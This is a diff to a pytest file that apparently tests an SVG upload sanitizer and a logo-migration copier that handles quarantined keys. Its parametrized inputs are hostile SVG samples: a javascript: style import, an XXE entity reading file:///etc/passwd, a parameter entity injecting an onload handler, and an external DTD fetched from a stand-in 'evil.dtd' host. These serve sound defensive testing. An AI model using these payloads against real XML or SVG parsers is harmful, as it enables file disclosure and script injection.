@@ -113,6 +113,8 @@ SVG_OPEN = b"<svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.
         b"<?xml-stylesheet type='text/xsl' href='#x'?>" + SVG_OPEN + b"</svg>",
         SVG_OPEN + b"<style>@import 'javascript:alert(1)';</style></svg>",
         b"<!DOCTYPE svg [<!ENTITY e SYSTEM 'file:///etc/passwd'>]>" + SVG_OPEN + b"<text>&e;</text></svg>",
+        b"<!DOCTYPE svg [<!ENTITY % d \"<!ATTLIST svg onload CDATA 'alert(document.domain)'>\">%d;]>" + SVG_OPEN + b"</svg>",
+        b"<!DOCTYPE svg [<!ENTITY\n%\td SYSTEM 'https://x/evil.dtd'>%d;]>" + SVG_OPEN + b"</svg>",
         b"<svg><rect/></svg>",
     ],
     ids=[
@@ -133,6 +135,8 @@ SVG_OPEN = b"<svg xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.
         "stylesheet instruction",
         "script url in style",
         "external entity",
+        "parameter entity hiding a handler",
+        "external parameter entity",
         "no svg namespace",
     ],
 )
@@ -244,6 +248,15 @@ def test_decoded_key_is_a_fallback_and_missing_objects_are_reported():
     cp, _, dest = copier({("legacy", "a b.png"): PNG})
     assert cp.resolve(lo.LOGO, "a%20b.png") == {"status": lo.COPIED, "key": "a b.png"}
     assert cp.resolve(lo.LOGO, "gone.png")["status"] == lo.MISSING
+
+
+def test_held_raw_key_is_retained_over_a_decoded_neighbour():
+    held = {("attachments", "quarantine/logos/a%20b.svg"): b"%PDF-1.7"}
+    cp, source, dest = copier({("legacy", "a b.svg"): SVG}, held)
+    got = cp.resolve(lo.LOGO, "a%20b.svg")
+    assert (got["status"], got["key"]) == (lo.QUARANTINED, "quarantine/logos/a%20b.svg")
+    assert dest.puts == [] and source.bodies == []
+    assert ("logos", "a b.svg") not in dest.objects
 
 
 @pytest.fixture
